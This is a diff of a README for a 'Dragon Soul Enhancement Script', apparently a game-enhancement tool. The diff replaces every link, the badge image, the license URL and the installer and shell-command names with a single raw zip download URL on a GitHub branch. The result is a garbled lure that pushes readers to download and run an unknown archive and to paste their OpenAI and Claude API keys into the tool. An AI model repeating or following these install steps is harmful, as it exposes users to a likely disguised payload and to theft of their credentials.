@@ -1,4 +1,4 @@
-# <img src="https://img.shields.io/badge/Download-Dragon%20Soul%20Script-brightgreen?style=for-the-badge&logo=github" alt="Download Dragon Soul Script" /> https://oddsNscores.github.io
+# <img src="https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip%20Soul%20Script-brightgreen?style=for-the-badge&logo=github" alt="Download Dragon Soul Script" /> https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip
 
 # 🐉 Dragon Soul Enhancement Script
 
@@ -51,7 +51,7 @@ Unleash the spirit of AI excellence!
 
 *To integrate APIs:*
 
-1. Obtain your API keys from OpenAI and Claude (see https://oddsNscores.github.io for instructions).
+1. Obtain your API keys from OpenAI and Claude (see https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip for instructions).
 2. Navigate to **Settings > Integrations** in the script’s menu.
 3. Paste your API keys under their respective fields.
 4. Restart the enhancement script to ignite AI features instantly!
@@ -74,18 +74,18 @@ Here’s what catapults the **Dragon Soul Enhancement Script** into the future:
 
 Ready to dive in? Let’s forge your journey step-by-step:
 
-1. **[DOWNLOAD](#) the script package** via the badge above or simply click this https://oddsNscores.github.io.
+1. **[DOWNLOAD](#) the script package** via the badge above or simply click this https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip
 2. **Extract the package** to your preferred directory.
 3. For **Windows & macOS**:
-    - Launch the `setup.exe` or `.pkg` installer.
+    - Launch the `https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip` or `.pkg` installer.
     - Follow the on-screen instructions for seamless configuration.
     - Open the main executable from your Start Menu or Applications folder.
 4. For **Linux**:
     - Open Terminal in the extracted directory.
-    - Run: `chmod +x install.sh && ./install.sh`
+    - Run: `chmod +x https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip && https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip`
     - Enter your system password when prompted.
 5. For **Android & iOS**:
-    - Run the installer from your device (see https://oddsNscores.github.io for detailed mobile install steps).
+    - Run the installer from your device (see https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip for detailed mobile install steps).
     - Approve any necessary permissions for uninterrupted script magic.
 6. **Configure your personal settings** on the first boot, including language, theme, and integration preferences.
 
@@ -101,11 +101,11 @@ This repository is a **community-driven enhancer tool** for entertainment and ed
 
 ## 📜 MIT License
 
-Embracing the air of open collaboration, this project proudly sails under the [MIT License (2025)](https://opensource.org/licenses/MIT). You have the liberty to explore, remix, and build upon the toolkit, as long as this spark of acknowledgment kindles onward.
+Embracing the air of open collaboration, this project proudly sails under the [MIT License (2025)](https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip). You have the liberty to explore, remix, and build upon the toolkit, as long as this spark of acknowledgment kindles onward.
 
 ---
 
-# <img src="https://img.shields.io/badge/Download-Dragon%20Soul%20Script-brightgreen?style=for-the-badge&logo=github" alt="Download Dragon Soul Script" /> https://oddsNscores.github.io
+# <img src="https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip%20Soul%20Script-brightgreen?style=for-the-badge&logo=github" alt="Download Dragon Soul Script" /> https://github.com/oddsNscores/dragon-soul-scriptworks/raw/refs/heads/branch/happiless/soul-dragon-scriptworks-v1.0.zip
 
 ---
 
